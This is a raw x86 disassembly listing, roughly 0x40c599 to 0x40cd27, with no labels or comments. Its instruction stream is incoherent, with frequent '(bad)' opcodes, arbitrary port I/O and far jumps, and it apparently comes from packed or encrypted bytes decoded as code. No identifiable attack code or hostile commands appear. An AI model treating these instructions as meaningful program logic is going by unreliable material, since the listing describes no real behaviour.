  40c599:	imul   ebp,DWORD PTR [ebp+0x41fea6d6],0x3b7bf91c
  40c5a3:	in     eax,0x45
  40c5a5:	fidiv  WORD PTR [edx+0x5a]
  40c5a8:	adc    al,0xcc
  40c5aa:	jns    0x40c574
  40c5ac:	cwde   
  40c5ad:	dec    edi
  40c5ae:	add    DWORD PTR [esp+ebp*2-0x36],esp
  40c5b2:	mov    ecx,0x8ce88571
  40c5b7:	mov    bl,0x4d
  40c5b9:	rcl    BYTE PTR [edi+eiz*2-0x27],1
  40c5bd:	stos   BYTE PTR es:[edi],al
  40c5be:	pop    ecx
  40c5bf:	outs   dx,BYTE PTR ds:[esi]
  40c5c0:	stc    
  40c5c1:	sahf   
  40c5c2:	or     al,BYTE PTR [ebp+0x127040e0]
  40c5c8:	out    dx,al
  40c5c9:	das    
  40c5ca:	sahf   
  40c5cb:	sbb    ch,al
  40c5cd:	adc    al,0xc2
  40c5cf:	js     0x40c5b8
  40c5d1:	mul    DWORD PTR [ebp-0x6c]
  40c5d4:	push   edi
  40c5d5:	fisub  DWORD PTR [esp+eax*8-0x27]
  40c5d9:	pop    esi
  40c5da:	cmp    al,0x25
  40c5dc:	inc    ecx
  40c5dd:	stos   BYTE PTR es:[edi],al
  40c5de:	neg    esi
  40c5e0:	mov    bh,0xe3
  40c5e2:	neg    bl
  40c5e4:	jmp    0x1b95:0x866feadf
  40c5eb:	not    BYTE PTR [esi]
  40c5ed:	mov    cl,0x3
  40c5ef:	mov    esp,0x3dc86f5b
  40c5f4:	jo     0x40c641
  40c5f6:	jg     0x40c627
  40c5f8:	sbb    BYTE PTR [ebp+0x76],dl
  40c5fb:	and    BYTE PTR [edi+esi*8-0x18],ah
  40c5ff:	push   es
  40c600:	add    edx,eax
  40c602:	test   eax,0x332002c3
  40c607:	shl    BYTE PTR [edx+0x1ca39c50],cl
  40c60d:	scas   al,BYTE PTR es:[edi]
  40c60e:	mov    dl,0x4
  40c610:	adc    al,0x9f
  40c612:	jbe    0x40c651
  40c614:	ret    0x8730
  40c617:	pusha  
  40c618:	mov    bl,0x92
  40c61a:	rcr    BYTE PTR [edx],cl
  40c61c:	mov    al,ds:0x2642bd1e
  40c621:	mov    bh,0xad
  40c623:	adc    bh,bl
  40c625:	dec    ebx
  40c626:	inc    eax
  40c627:	cmp    cl,BYTE PTR [ecx+eax*1+0xb]
  40c62b:	xor    eax,DWORD PTR [esi-0x9]
  40c62e:	and    dh,BYTE PTR [esi-0x3]
  40c631:	xor    edx,esp
  40c633:	inc    esp
  40c634:	mov    edx,0x81ee2cfb
  40c639:	adc    esp,ecx
  40c63b:	mov    esi,0x81824da9
  40c640:	pop    eax
  40c641:	cmp    eax,0xc4307b84
  40c646:	call   0x46824dab
  40c64b:	dec    ebx
  40c64c:	shl    BYTE PTR [ecx-0x5c4cc031],0x39
  40c653:	xchg   ebx,eax
  40c654:	sbb    eax,0x39ec1aac
  40c659:	or     eax,edx
  40c65b:	cmc    
  40c65c:	mov    ebx,0xeb542b7f
  40c661:	mov    ecx,0x96303db8
  40c666:	mov    al,ds:0xcf16fd70
  40c66b:	pop    esi
  40c66c:	(bad)  
  40c66d:	aam    0xc0
  40c66f:	leave  
  40c670:	push   ss
  40c671:	pop    ds
  40c672:	xchg   edx,eax
  40c673:	arpl   bp,dx
  40c675:	ja     0x40c62a
  40c677:	jae    0x40c648
  40c679:	push   0xe3cc59fa
  40c67e:	inc    esi
  40c67f:	rcl    BYTE PTR [eax+0xd417c17],cl
  40c685:	jg     0x40c6c4
  40c687:	lea    esp,[ecx+0x648a6ae1]
  40c68d:	clc    
  40c68e:	ds fwait
  40c690:	xor    bl,BYTE PTR [eax]
  40c692:	scas   eax,DWORD PTR es:[edi]
  40c693:	jb     0x40c61c
  40c695:	jno    0x40c68d
  40c697:	dec    ebx
  40c698:	jnp    0x40c716
  40c69a:	sub    BYTE PTR [ebx],bl
  40c69c:	lea    eax,[ecx+0x782ab17f]
  40c6a2:	daa    
  40c6a3:	fdiv   QWORD PTR [esi-0x33f76616]
  40c6a9:	in     eax,dx
  40c6aa:	int    0x1e
  40c6ac:	daa    
  40c6ad:	jns    0x40c6f5
  40c6af:	mov    dl,0xad
  40c6b1:	pop    ebp
  40c6b2:	add    eax,0xe7e460e4
  40c6b7:	je     0x40c68e
  40c6b9:	xchg   esp,eax
  40c6ba:	add    dh,BYTE PTR [esi+esi*1]
  40c6bd:	push   eax
  40c6be:	inc    eax
  40c6bf:	fist   DWORD PTR [eax-0x64c0ce6f]
  40c6c5:	push   ecx
  40c6c6:	inc    esp
  40c6c7:	and    al,0x45
  40c6c9:	enter  0xc828,0xec
  40c6cd:	mov    al,BYTE PTR [ecx]
  40c6cf:	clc    
  40c6d0:	mov    ecx,es
  40c6d2:	cmp    DWORD PTR [ebx+0x13],0x7b15f511
  40c6d9:	(bad)
  40c6dc:	(bad)  
  40c6dd:	in     eax,dx
  40c6de:	pop    ecx
  40c6df:	push   ds
  40c6e0:	push   edx
  40c6e1:	adc    al,0x48
  40c6e3:	in     al,dx
  40c6e4:	sbb    DWORD PTR [esi-0x1d28956d],esp
  40c6ea:	and    eax,0xc1e3c877
  40c6ef:	or     DWORD PTR [ebp-0x1e082a78],ecx
  40c6f5:	push   ebx
  40c6f6:	shl    ebx,0x2
  40c6f9:	in     eax,0x61
  40c6fb:	test   eax,0x40d9c956
  40c700:	(bad)  
  40c701:	out    dx,al
  40c702:	clc    
  40c703:	push   ecx
  40c704:	int    0x4c
  40c706:	(bad)  
  40c708:	mov    ecx,0xf86c44d8
  40c70d:	(bad)  
  40c70f:	pop    ebx
  40c710:	adc    ebx,DWORD PTR [edx]
  40c712:	jb     0x40c6dd
  40c714:	test   edi,eax
  40c716:	cmp    dh,BYTE PTR [edx+0x278bcdc3]
  40c71c:	fcomp  DWORD PTR [edi-0x8]
  40c71f:	mov    bl,0x98
  40c721:	mov    ch,0x3e
  40c723:	dec    ebp
  40c724:	icebp  
  40c725:	arpl   di,bx
  40c727:	sub    al,0x11
  40c729:	in     eax,0x60
  40c72b:	xor    DWORD PTR [eax+0x22],0x2916ca52
  40c732:	rcr    BYTE PTR [eax],cl
  40c734:	mov    eax,ds:0xfdc67e2a
  40c739:	dec    BYTE PTR ds:0x4d4f6ed3
  40c73f:	in     al,dx
  40c740:	pop    ebp
  40c741:	mov    al,ds:0x7653d54d
  40c746:	stos   DWORD PTR es:[edi],eax
  40c747:	mov    dl,0x61
  40c749:	or     al,0x74
  40c74b:	xchg   ebp,eax
  40c74c:	adc    eax,0xb3d06e12
  40c751:	sahf   
  40c752:	xchg   esi,eax
  40c753:	inc    ecx
  40c754:	xor    ch,ch
  40c756:	enter  0xebde,0x1e
  40c75a:	in     eax,0x5c
  40c75c:	ret    0x636a
  40c75f:	ja     0x40c7d9
  40c761:	sbb    DWORD PTR [ebp-0x52],esp
  40c764:	push   ds
  40c765:	jg     0x40c730
  40c767:	lahf   
  40c768:	shl    al,1
  40c76a:	lds    edx,FWORD PTR [ebx+0x2d]
  40c76d:	mov    esp,DWORD PTR ds:0x888328e6
  40c773:	ins    BYTE PTR es:[edi],dx
  40c774:	sti    
  40c775:	retf   
  40c776:	leave  
  40c777:	push   ebx
  40c778:	xchg   esp,eax
  40c779:	retf   0xf636
  40c77c:	fdivr  QWORD PTR [ebx+ebp*2-0x2c]
  40c780:	data16 arpl WORD PTR [eax-0x89acf9b],bp
  40c787:	sub    eax,0xf73d79d0
  40c78c:	jecxz  0x40c7a0
  40c78e:	or     BYTE PTR [esi+0x34],0xc4
  40c792:	mov    dh,0xae
  40c794:	add    al,ch
  40c796:	punpckhwd mm2,QWORD PTR [ebx]
  40c799:	aam    0xc4
  40c79b:	and    al,0x26
  40c79d:	adc    al,0xe7
  40c79f:	jle    0x40c72f
  40c7a1:	mov    eax,0x80911f6e
  40c7a6:	and    al,0xf7
  40c7a8:	mov    ecx,0x765df4eb
  40c7ad:	aad    0xff
  40c7af:	fisttp QWORD PTR [ebp-0x33ba7676]
  40c7b5:	cs sub BYTE PTR cs:[ecx+eiz*1],dl
  40c7ba:	repz mov dh,0xd2
  40c7bd:	push   esp
  40c7be:	out    dx,eax
  40c7bf:	inc    edx
  40c7c0:	scas   al,BYTE PTR es:[edi]
  40c7c1:	cs lock int 0x28
  40c7c5:	add    al,0x54
  40c7c7:	call   0xbbaf6e83
  40c7cc:	(bad)  
  40c7cd:	or     eax,0x1473c649
  40c7d2:	(bad)  
  40c7d3:	iret   
  40c7d4:	jns    0x40c764
  40c7d6:	or     BYTE PTR [edi],dl
  40c7d8:	daa    
  40c7d9:	push   0x78
  40c7db:	leave  
  40c7dc:	sub    BYTE PTR [ecx-0x59aee4a5],0x86
  40c7e3:	dec    ebp
  40c7e4:	mov    eax,ds:0x52bb7a68
  40c7e9:	inc    edx
  40c7ea:	jb     0x40c7db
  40c7ec:	push   0x6a
  40c7ee:	(bad)  
  40c7ef:	xlat   BYTE PTR ds:[ebx]
  40c7f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7f1:	fwait
  40c7f2:	call   0xbddc15ca
  40c7f7:	push   0xffffffb1
  40c7f9:	imul   esp,DWORD PTR [eax],0xc
  40c7fc:	dec    edx
  40c7fd:	xrelease xchg DWORD PTR [ecx-0x25ece488],edi
  40c804:	xchg   DWORD PTR [ecx-0x139bd133],ebx
  40c80a:	dec    ebp
  40c80b:	data16 aas 
  40c80d:	pop    esp
  40c80e:	jbe    0x40c824
  40c810:	(bad)  [ebx+ecx*1]
  40c813:	shr    DWORD PTR [edi*2+0x7d81a42d],1
  40c81a:	imul   eax,DWORD PTR [esi-0x62],0xbee7df33
  40c821:	hlt    
  40c822:	pusha  
  40c823:	mov    ebx,edi
  40c825:	push   ecx
  40c826:	inc    ebx
  40c827:	mov    ebx,0x14b85d71
  40c82c:	dec    ecx
  40c82d:	push   0x4714c720
  40c832:	bound  edi,QWORD PTR [esi+ebp*2-0x1f]
  40c836:	out    dx,al
  40c837:	inc    ebx
  40c838:	loop   0x40c896
  40c83a:	adc    edi,ebx
  40c83c:	mov    bl,0x48
  40c83e:	mov    edi,0x8b6b43f5
  40c843:	add    DWORD PTR [edi],esp
  40c845:	sahf   
  40c846:	add    edi,DWORD PTR [ecx-0x48]
  40c849:	adc    ebp,DWORD PTR [ebx+edx*4-0x40d1029f]
  40c850:	loope  0x40c886
  40c852:	push   esp
  40c853:	iret   
  40c854:	add    eax,0x197862aa
  40c859:	aaa    
  40c85a:	int    0xfe
  40c85c:	add    BYTE PTR [esi-0x6e3cc151],0x2e
  40c863:	dec    esi
  40c864:	in     al,dx
  40c865:	sbb    bl,BYTE PTR [eax-0x8c7acd7]
  40c86b:	into   
  40c86c:	(bad)  
  40c86e:	ss jbe 0x40c83c
  40c871:	sbb    dl,BYTE PTR [ecx]
  40c873:	dec    esi
  40c874:	fdiv   st(6),st
  40c876:	icebp  
  40c877:	or     al,0xa
  40c879:	shl    WORD PTR [ecx-0x3966c4d1],0x35
  40c881:	push   cs
  40c882:	xor    BYTE PTR [edi],dl
  40c884:	cdq    
  40c885:	mov    dl,0x83
  40c887:	dec    ecx
  40c888:	or     ebp,ecx
  40c88a:	arpl   ax,dx
  40c88c:	lock push esi
  40c88e:	sbb    al,0xde
  40c890:	int3   
  40c891:	add    DWORD PTR [ebx+0x6e1ddf93],ebx
  40c897:	mov    dl,0x4e
  40c899:	jbe    0x40c879
  40c89b:	popa   
  40c89c:	adc    cl,ch
  40c89e:	rol    DWORD PTR [ecx],1
  40c8a0:	or     al,0xc2
  40c8a2:	xchg   ebp,eax
  40c8a3:	jle    0x40c91f
  40c8a5:	mov    ch,0xbb
  40c8a7:	mov    DWORD PTR [eax],0x2ca89cbb
  40c8ad:	(bad)  
  40c8ae:	adc    ah,BYTE PTR [esi+edx*1-0x31]
  40c8b2:	shl    BYTE PTR [edx+0x5c],1
  40c8b5:	pop    ebp
  40c8b6:	push   cs
  40c8b7:	cmpxchg dl,al
  40c8ba:	jmp    0x40c88d
  40c8bc:	adc    eax,0x4ec0eb30
  40c8c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8c2:	fiadd  DWORD PTR [edi]
  40c8c4:	xor    al,0xe1
  40c8c6:	xor    eax,DWORD PTR [edi+0x4a]
  40c8c9:	pushf  
  40c8ca:	jp     0x40c92a
  40c8cc:	aas    
  40c8cd:	inc    ebp
  40c8ce:	jb     0x40c87a
  40c8d0:	ret    
  40c8d1:	fmul   st(1),st
  40c8d3:	gs and eax,0x534a9706
  40c8d9:	out    dx,eax
  40c8da:	cdq    
  40c8db:	imul   esi,DWORD PTR [esi],0x63c4c8b9
  40c8e1:	sub    eax,0x4349380c
  40c8e6:	cmp    al,dh
  40c8e8:	out    dx,al
  40c8e9:	sbb    ebp,edi
  40c8eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8ec:	mov    edi,0xd50392a5
  40c8f1:	cmp    al,0x71
  40c8f3:	sbb    eax,0x17f3bc75
  40c8f8:	jbe    0x40c938
  40c8fa:	call   0xe4714a94
  40c8ff:	int    0x21
  40c901:	and    eax,0x452dcb60
  40c906:	dec    edx
  40c907:	fidiv  WORD PTR [ecx+esi*4+0x18]
  40c90b:	xchg   esi,eax
  40c90c:	sbb    al,0x35
  40c90e:	mov    ds:0xda4a67e6,al
  40c913:	mov    ebp,0x98baa8bf
  40c918:	ss inc ecx
  40c91a:	js     0x40c904
  40c91c:	cmp    al,0x64
  40c91e:	sub    al,0x47
  40c920:	mov    edx,0xd3b41e00
  40c925:	jmp    0x40c982
  40c927:	push   ebp
  40c928:	jecxz  0x40c95c
  40c92a:	mov    dl,dl
  40c92c:	ins    BYTE PTR es:[edi],dx
  40c92d:	repz (bad) 
  40c92f:	jns    0x40c907
  40c931:	adc    eax,0x24204640
  40c936:	popf   
  40c937:	jecxz  0x40c959
  40c939:	dec    edi
  40c93a:	mov    BYTE PTR [ebp-0x2b367d1d],ah
  40c940:	hlt    
  40c941:	inc    eax
  40c942:	push   ds
  40c943:	cmp    DWORD PTR [ebx],edi
  40c945:	aam    0xe4
  40c947:	mov    dh,0x4d
  40c949:	stc    
  40c94a:	cld    
  40c94b:	imul   edx,ebx,0x64
  40c94e:	xor    al,0xa0
  40c950:	(bad)  
  40c952:	leave  
  40c953:	pop    ebp
  40c954:	data16 stos BYTE PTR es:[edi],al
  40c956:	test   BYTE PTR [edi+0x5c],bl
  40c959:	cmp    dl,BYTE PTR [ebx+0x2a]
  40c95c:	mov    dl,0x88
  40c95e:	sbb    eax,0x554f4cb7
  40c963:	add    eax,0x18394796
  40c968:	xchg   ebx,eax
  40c969:	mov    cs,WORD PTR [ecx+0x10]
  40c96c:	push   DWORD PTR [esi-0x78]
  40c96f:	mov    ebx,0x1c5e0fec
  40c974:	loopne 0x40c99a
  40c976:	xchg   edx,eax
  40c977:	lea    edi,[esp+ecx*4]
  40c97a:	call   0x87cd:0x4199ea19
  40c981:	arpl   ax,si
  40c983:	(bad)  
  40c985:	rcr    dh,0x33
  40c988:	sbb    bh,dl
  40c98a:	jo     0x40c943
  40c98c:	pop    esp
  40c98d:	xchg   ebp,eax
  40c98e:	les    ebp,FWORD PTR [edx-0x7b]
  40c991:	dec    edi
  40c992:	xchg   esi,eax
  40c993:	rcl    ecx,0x9c
  40c996:	test   al,0x12
  40c998:	das    
  40c999:	sbb    eax,0xdf4523dc
  40c99e:	and    cl,BYTE PTR [ebp+0xb20febc]
  40c9a4:	dec    edi
  40c9a5:	or     dh,ch
  40c9a7:	bndstx [ebx+0x3febc9e],(bad)
  40c9ae:	pop    ecx
  40c9af:	jb     0x40c972
  40c9b1:	sub    DWORD PTR [esi],ecx
  40c9b3:	push   DWORD PTR ds:0x528830e0
  40c9b9:	pop    esp
  40c9ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9bb:	pop    edx
  40c9bc:	repz sbb ebp,DWORD PTR ds:0x5f9c1654
  40c9c3:	pop    edx
  40c9c4:	jae    0x40ca07
  40c9c6:	pusha  
  40c9c7:	adc    DWORD PTR [edi+0x541d1f3d],ebx
  40c9cd:	xchg   edx,eax
  40c9ce:	adc    ch,cl
  40c9d0:	cmp    cl,BYTE PTR [ebx+0x6658f2ad]
  40c9d6:	mov    cl,0x35
  40c9d8:	jne    0x40c9aa
  40c9da:	scas   eax,DWORD PTR es:[edi]
  40c9db:	mov    esp,0x8b3787b5
  40c9e0:	inc    esi
  40c9e1:	push   ds
  40c9e2:	cmp    al,bh
  40c9e4:	push   esi
  40c9e5:	cwde   
  40c9e6:	fnstcw WORD PTR [esi]
  40c9e8:	sar    DWORD PTR [ebp-0x1e],0xc3
  40c9ec:	shl    DWORD PTR [ebp-0x63372f6d],cl
  40c9f2:	cli    
  40c9f3:	inc    edi
  40c9f4:	push   ss
  40c9f5:	stos   BYTE PTR es:[edi],al
  40c9f6:	and    al,0x6b
  40c9f8:	fild   WORD PTR [edx+esi*8-0x2a12985f]
  40c9ff:	out    dx,eax
  40ca00:	inc    edx
  40ca01:	jbe    0x40c9be
  40ca03:	outs   dx,BYTE PTR ds:[esi]
  40ca04:	pop    eax
  40ca05:	in     eax,dx
  40ca06:	call   0x770cfd70
  40ca0b:	pop    ss
  40ca0c:	sub    eax,0x91893808
  40ca11:	jne    0x40c9ce
  40ca13:	push   es
  40ca14:	fisub  WORD PTR [eax+0x7cf00bc9]
  40ca1a:	call   0xcd87:0xde3712d5
  40ca21:	ja     0x40ca67
  40ca23:	leave  
  40ca24:	dec    eax
  40ca25:	icebp  
  40ca26:	hlt    
  40ca27:	inc    DWORD PTR [eax+edi*4-0x73]
  40ca2b:	std    
  40ca2c:	xchg   BYTE PTR [ebx+ecx*8+0x503bed2c],bh
  40ca33:	jbe    0x40c9e9
  40ca35:	arpl   WORD PTR [esi],bx
  40ca37:	mov    eax,0x2ce9fef9
  40ca3c:	pop    ebp
  40ca3d:	and    ecx,DWORD PTR [ebx+0xbf5f165]
  40ca43:	mov    eax,ds:0x8aa5fdb9
  40ca48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca49:	mov    ecx,ebp
  40ca4b:	sti    
  40ca4c:	xchg   ebp,eax
  40ca4e:	pop    edx
  40ca4f:	fcmovnbe st,st(6)
  40ca51:	xor    al,0xfd
  40ca53:	mov    dl,0x80
  40ca55:	aas    
  40ca56:	mov    esp,DWORD PTR [edi-0x2c846c3]
  40ca5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca5d:	enter  0xcbfb,0x91
  40ca61:	adc    bl,bh
  40ca63:	adc    ebx,DWORD PTR [esi+esi*1-0x58]
  40ca67:	arpl   WORD PTR [ebx+eiz*2],ax
  40ca6a:	repz test DWORD PTR [ecx+edx*1+0x44],esp
  40ca6f:	loopne 0x40cab8
  40ca71:	icebp  
  40ca72:	adc    DWORD PTR [ebx-0x6d],edx
  40ca75:	stos   DWORD PTR es:[edi],eax
  40ca76:	ja     0x40ca4f
  40ca78:	dec    ebp
  40ca79:	stos   BYTE PTR es:[edi],al
  40ca7a:	xlat   BYTE PTR ds:[ebx]
  40ca7b:	xchg   ecx,eax
  40ca7c:	(bad)
  40ca80:	aas    
  40ca81:	leave  
  40ca82:	adc    ebp,DWORD PTR ds:0xc71e4a80
  40ca88:	jae    0x40caa7
  40ca8a:	imul   esp,ebp,0x7643c96d
  40ca90:	into   
  40ca91:	xlat   BYTE PTR cs:[ebx]
  40ca93:	dec    eax
  40ca94:	arpl   WORD PTR [edx-0x50bb812d],bp
  40ca9a:	in     al,0x75
  40ca9c:	jns    0x40ca9d
  40ca9e:	inc    esp
  40ca9f:	inc    eax
  40caa0:	loopne 0x40ca76
  40caa2:	shl    BYTE PTR [edx-0x18],1
  40caa5:	aam    0x17
  40caa7:	push   ebp
  40caa8:	pop    esp
  40caa9:	dec    edi
  40caaa:	inc    eax
  40caab:	xor    eax,0x9ccb97a
  40cab0:	pop    edx
  40cab1:	bndldx bnd3,[eax]
  40cab4:	outs   dx,BYTE PTR ds:[esi]
  40cab5:	jae    0x40cadd
  40cab7:	sub    edi,0xa4e75646
  40cabd:	ret    
  40cabe:	out    dx,al
  40cabf:	mov    edx,0xf4374743
  40cac4:	fadd   st,st(4)
  40cac6:	xchg   edx,eax
  40cac7:	rol    edi,0xd9
  40caca:	call   0xd75f6284
  40cacf:	add    esp,DWORD PTR [edx-0x75]
  40cad2:	test   DWORD PTR [eax-0x31],0x6ce9b5f0
  40cad9:	push   esi
  40cada:	jbe    0x40cb14
  40cadc:	sti    
  40cadd:	sbb    DWORD PTR [eax-0x46],ebp
  40cae0:	jl     0x40cb15
  40cae2:	sub    eax,DWORD PTR [eax]
  40cae4:	mov    bl,BYTE PTR [edi+ebp*8]
  40cae7:	mov    ds:0x6040b388,eax
  40caec:	sub    DWORD PTR [edi+0x41],esi
  40caef:	pmuludq mm0,QWORD PTR ss:[ebp+ecx*4-0x5c093fca]
  40caf8:	jle    0x40cb70
  40cafa:	dec    esp
  40cafb:	rcl    ebx,1
  40cafd:	lods   eax,DWORD PTR ds:[esi]
  40cafe:	mov    bl,0xc2
  40cb00:	mov    edx,0x2732cb6b
  40cb05:	add    DWORD PTR [edi+0x7f],esi
  40cb08:	call   0xedb976e0
  40cb0d:	test   eax,0x23226dd0
  40cb12:	jns    0x40cb73
  40cb14:	jnp    0x40caeb
  40cb16:	jbe    0x40cadd
  40cb18:	dec    edx
  40cb19:	mov    eax,ds:0x761bdd2f
  40cb1e:	neg    DWORD PTR [eax-0x4e]
  40cb21:	mov    bl,0xf4
  40cb23:	test   DWORD PTR [eax+0x2f],0x627ecffa
  40cb2a:	mov    eax,DWORD PTR [eax]
  40cb2c:	fs aaa 
  40cb2e:	inc    ecx
  40cb2f:	pop    ds
  40cb30:	data16 and BYTE PTR [edi+eax*8-0x2c],bl
  40cb35:	push   esi
  40cb36:	sub    dl,BYTE PTR [edx+0x12786fa1]
  40cb3c:	or     ebp,DWORD PTR [ecx+eax*8+0x45c7cbc1]
  40cb43:	ds jmp 0x848f64a8
  40cb49:	jns    0x40cb0c
  40cb4b:	sbb    bl,al
  40cb4d:	mov    al,ds:0x3eb5f2cd
  40cb52:	jl     0x40cb2f
  40cb54:	mov    ebx,0xcfeaa4ab
  40cb59:	adc    al,0x6b
  40cb5b:	jle    0x40cbc2
  40cb5d:	xor    edx,edi
  40cb5f:	mov    eax,ds:0x87f5075c
  40cb64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb65:	xchg   edx,eax
  40cb66:	or     edi,DWORD PTR [edi]
  40cb68:	aaa    
  40cb69:	xor    BYTE PTR [eax-0x3a],ch
  40cb6c:	inc    esi
  40cb6d:	arpl   WORD PTR [ecx-0x3e04680b],cx
  40cb73:	adc    dl,BYTE PTR [esi+esi*2-0x6f]
  40cb77:	pusha  
  40cb78:	cmp    ebx,DWORD PTR [ecx+esi*2-0x412ae581]
  40cb7f:	pusha  
  40cb80:	pop    ebp
  40cb81:	mov    esi,0xa8c4d976
  40cb86:	es test eax,0x9f2139f9
  40cb8c:	inc    ecx
  40cb8d:	retf   0xad83
  40cb90:	jne    0x40cba0
  40cb92:	add    esi,DWORD PTR fs:[ebx+0x4]
  40cb96:	inc    ebp
  40cb97:	fidivr WORD PTR [edx+0x79]
  40cb9a:	and    ah,BYTE PTR cs:[ebp-0x3d]
  40cb9e:	in     eax,0x11
  40cba0:	gs ins DWORD PTR es:[edi],dx
  40cba2:	dec    esi
  40cba3:	xor    BYTE PTR [edi-0x3ebc1450],cl
  40cba9:	loopne 0x40cbeb
  40cbab:	stos   BYTE PTR es:[edi],al
  40cbac:	sub    eax,0x372c9240
  40cbb1:	data16 scas al,BYTE PTR es:[edi]
  40cbb3:	test   esi,0x2221af9e
  40cbb9:	mov    edx,0x563a9fa3
  40cbbe:	jo     0x40cbca
  40cbc0:	add    eax,0xccbb6783
  40cbc5:	add    DWORD PTR [eax-0x2324bce3],esi
  40cbcb:	test   BYTE PTR [ecx],0x98
  40cbce:	in     al,0xed
  40cbd0:	ja     0x40cc04
  40cbd2:	mov    bl,0x23
  40cbd4:	scas   eax,DWORD PTR es:[edi]
  40cbd5:	sahf   
  40cbd6:	and    al,0x71
  40cbd8:	fs sahf 
  40cbda:	adc    eax,0x6a706097
  40cbdf:	xchg   esi,eax
  40cbe0:	aam    0xb
  40cbe2:	js     0x40cb9b
  40cbe4:	inc    ebx
  40cbe5:	out    0x7e,eax
  40cbe7:	cmp    bl,BYTE PTR [esi]
  40cbe9:	mov    ebp,DWORD PTR [edi]
  40cbeb:	xlat   BYTE PTR ds:[ebx]
  40cbec:	dec    ecx
  40cbed:	jo     0x40cbdd
  40cbef:	mov    cl,0x20
  40cbf1:	fisubr WORD PTR [ebx]
  40cbf3:	jno    0x40cbea
  40cbf5:	fild   DWORD PTR [esi+0x2f]
  40cbf8:	mov    ecx,0x2422b12d
  40cbfd:	dec    eax
  40cbfe:	and    al,0x9b
  40cc00:	dec    esi
  40cc01:	push   eax
  40cc02:	test   DWORD PTR [ebx],ebp
  40cc04:	push   ecx
  40cc05:	loope  0x40cba0
  40cc07:	jo     0x40cc28
  40cc09:	mov    dl,0xdc
  40cc0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc0c:	jae    0x40cb91
  40cc0e:	inc    esp
  40cc0f:	jg     0x40cc89
  40cc11:	add    al,0xa3
  40cc13:	jmp    0x40cc4d
  40cc15:	cmc    
  40cc16:	inc    esi
  40cc17:	mov    cs,WORD PTR [esi+edi*1+0x4ba4a624]
  40cc1e:	fldenv [ecx-0x5a2af313]
  40cc24:	dec    ecx
  40cc25:	fwait
  40cc26:	stc    
  40cc27:	sub    al,0x0
  40cc29:	out    dx,eax
  40cc2a:	out    0x18,al
  40cc2c:	stos   BYTE PTR es:[edi],al
  40cc2d:	and    eax,0xc369269d
  40cc32:	fwait
  40cc33:	jae    0x40cc71
  40cc35:	inc    edi
  40cc36:	cmc    
  40cc37:	mov    esp,0x29f06bf1
  40cc3c:	push   cs
  40cc3d:	push   ebp
  40cc3e:	add    esi,DWORD PTR [esi]
  40cc40:	adc    al,0xd6
  40cc42:	(bad)  [ecx]
  40cc44:	addr16 pop ss
  40cc46:	push   ds
  40cc47:	xor    BYTE PTR [esi-0x1b],0x45
  40cc4b:	loope  0x40ccaf
  40cc4d:	jg     0x40ccb4
  40cc4f:	cli    
  40cc50:	and    esi,esi
  40cc52:	rcr    BYTE PTR [ebx-0xc],cl
  40cc55:	ret    
  40cc56:	mov    ch,0x34
  40cc58:	jae    0x40cc33
  40cc5a:	shl    BYTE PTR [edi],1
  40cc5c:	into   
  40cc5d:	icebp  
  40cc5e:	mov    ebx,0x93636668
  40cc63:	ret    
  40cc64:	pop    edx
  40cc65:	mov    dh,0x3f
  40cc67:	fucom  st(6)
  40cc69:	jnp    0x40cc23
  40cc6b:	enter  0x9bf7,0x44
  40cc6f:	cmc    
  40cc70:	jmp    0xfdfd1da1
  40cc75:	cmp    eax,0xf048add3
  40cc7a:	loope  0x40ccba
  40cc7c:	lods   eax,DWORD PTR ds:[esi]
  40cc7d:	dec    esp
  40cc7e:	fsub   DWORD PTR [edi-0xac0911c]
  40cc84:	ds mov al,0xf8
  40cc87:	in     eax,dx
  40cc88:	imul   ebp,DWORD PTR [ebx+ebp*4+0x38827aa6],0x79
  40cc90:	pop    ecx
  40cc91:	dec    ebp
  40cc92:	add    al,0xf8
  40cc94:	out    dx,eax
  40cc95:	xchg   edx,eax
  40cc96:	inc    esp
  40cc97:	xchg   DWORD PTR [ecx+0x3a],ebx
  40cc9a:	mov    eax,0x9d28db92
  40cc9f:	ret    
  40cca0:	pushf  
  40cca1:	and    dh,BYTE PTR [ecx+0x59f86189]
  40cca7:	dec    ebp
  40cca8:	ret    
  40cca9:	or     DWORD PTR [edx],edi
  40ccab:	pop    esi
  40ccac:	mov    ah,0xb
  40ccae:	and    DWORD PTR [eax+0x7e],eax
  40ccb1:	jmp    0x40cc89
  40ccb3:	int3   
  40ccb4:	lea    ebx,ds:0x86884fe3
  40ccba:	cmp    eax,0xed01eeab
  40ccbf:	mov    ss,WORD PTR [edx-0x3f]
  40ccc2:	mov    esp,0x7640f0d3
  40ccc7:	(bad)  
  40ccc8:	dec    esp
  40ccc9:	push   eax
  40ccca:	leave  
  40cccb:	pop    es
  40cccc:	xor    eax,0x1ff9697a
  40ccd1:	dec    ecx
  40ccd2:	adc    al,0xb7
  40ccd4:	fcom   DWORD PTR [bp+si-0x5d95]
  40ccd9:	mov    ds:0x86967fd,eax
  40ccde:	sbb    ah,BYTE PTR [esp+eiz*4+0x187b44dc]
  40cce5:	or     dl,dh
  40cce7:	xchg   BYTE PTR [eax+0x32ea099c],ch
  40cced:	int3   
  40ccee:	ins    DWORD PTR es:[edi],dx
  40ccef:	push   eax
  40ccf0:	inc    edi
  40ccf1:	inc    ecx
  40ccf2:	in     eax,dx
  40ccf3:	pop    eax
  40ccf4:	outs   dx,DWORD PTR ds:[esi]
  40ccf5:	cmp    al,0xbf
  40ccf7:	push   cs
  40ccf8:	mov    ds:0xdc10af4b,eax
  40ccfd:	cs pusha 
  40ccff:	mov    eax,ds:0x521871fc
  40cd04:	scas   eax,DWORD PTR es:[edi]
  40cd05:	not    DWORD PTR [edi+0x1c]
  40cd08:	mov    dh,0x8
  40cd0a:	sbb    eax,0x93950ed4
  40cd0f:	fs mov cl,0x5e
  40cd12:	(bad)  
  40cd13:	lock mov ebp,0x8ef38d76
  40cd19:	add    DWORD PTR ds:0x52a85da4,edx
  40cd1f:	lds    esi,FWORD PTR [ebp-0x7b]
  40cd22:	mov    edx,0x2431be1b
  40cd27:	push   0x3
